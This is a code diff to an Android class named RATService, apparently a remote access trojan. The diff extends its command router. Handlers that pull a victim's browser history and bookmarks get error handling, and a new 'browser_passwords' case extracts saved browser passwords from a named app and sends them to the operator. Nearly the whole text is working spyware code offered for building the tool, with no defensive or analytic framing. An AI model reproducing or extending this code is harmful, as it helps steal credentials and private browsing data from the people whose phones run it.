@@ -751,9 +751,7 @@ public class RATService extends Service {
 
                 // In routeCommand() method, add these cases:
 
-
-
-// In routeCommand method, replace the browser-related cases with this consolidated version:
+// Add this to your routeCommand method where you handle other commands
 
 case "browser_data":
 case "get_browsers":
@@ -779,13 +777,18 @@ case "browser_export":
 case "browser_history":
     if (browserModule != null && !args.isEmpty()) {
         Log.d(TAG, "🌐 Getting history for: " + args);
-        JSONArray history = browserModule.getBrowserHistory(args);
-        JSONObject result = new JSONObject();
-        result.put("success", true);
-        result.put("packageName", args);
-        result.put("history", history);
-        result.put("count", history.length());
-        sendCommand("BROWSER_HISTORY|" + result.toString());
+        try {
+            JSONArray history = browserModule.getBrowserHistory(args);
+            JSONObject result = new JSONObject();
+            result.put("success", true);
+            result.put("packageName", args);
+            result.put("history", history);
+            result.put("count", history.length());
+            sendCommand("BROWSER_HISTORY|" + result.toString());
+        } catch (JSONException e) {
+            Log.e(TAG, "Error creating browser history response", e);
+            sendCommand("BROWSER_HISTORY|{\"success\":false,\"error\":\"" + e.getMessage() + "\"}");
+        }
     } else {
         sendCommand("BROWSER_HISTORY|{\"success\":false,\"error\":\"Invalid package name\"}");
     }
@@ -794,19 +797,42 @@ case "browser_history":
 case "browser_bookmarks":
     if (browserModule != null && !args.isEmpty()) {
         Log.d(TAG, "🌐 Getting bookmarks for: " + args);
-        JSONArray bookmarks = browserModule.getBrowserBookmarks(args);
-        JSONObject result = new JSONObject();
-        result.put("success", true);
-        result.put("packageName", args);
-        result.put("bookmarks", bookmarks);
-        result.put("count", bookmarks.length());
-        sendCommand("BROWSER_BOOKMARKS|" + result.toString());
+        try {
+            JSONArray bookmarks = browserModule.getBrowserBookmarks(args);
+            JSONObject result = new JSONObject();
+            result.put("success", true);
+            result.put("packageName", args);
+            result.put("bookmarks", bookmarks);
+            result.put("count", bookmarks.length());
+            sendCommand("BROWSER_BOOKMARKS|" + result.toString());
+        } catch (JSONException e) {
+            Log.e(TAG, "Error creating browser bookmarks response", e);
+            sendCommand("BROWSER_BOOKMARKS|{\"success\":false,\"error\":\"" + e.getMessage() + "\"}");
+        }
     } else {
         sendCommand("BROWSER_BOOKMARKS|{\"success\":false,\"error\":\"Invalid package name\"}");
     }
     break;
 
-
+case "browser_passwords":
+    if (browserModule != null && !args.isEmpty()) {
+        Log.d(TAG, "🌐 Getting passwords for: " + args);
+        try {
+            JSONArray passwords = browserModule.getSavedPasswords(args);
+            JSONObject result = new JSONObject();
+            result.put("success", true);
+            result.put("packageName", args);
+            result.put("passwords", passwords);
+            result.put("count", passwords.length());
+            sendCommand("BROWSER_PASSWORDS|" + result.toString());
+        } catch (JSONException e) {
+            Log.e(TAG, "Error creating browser passwords response", e);
+            sendCommand("BROWSER_PASSWORDS|{\"success\":false,\"error\":\"" + e.getMessage() + "\"}");
+        }
+    } else {
+        sendCommand("BROWSER_PASSWORDS|{\"success\":false,\"error\":\"Invalid package name\"}");
+    }
+    break;
                 
 // In routeCommand() method, add these cases:
 
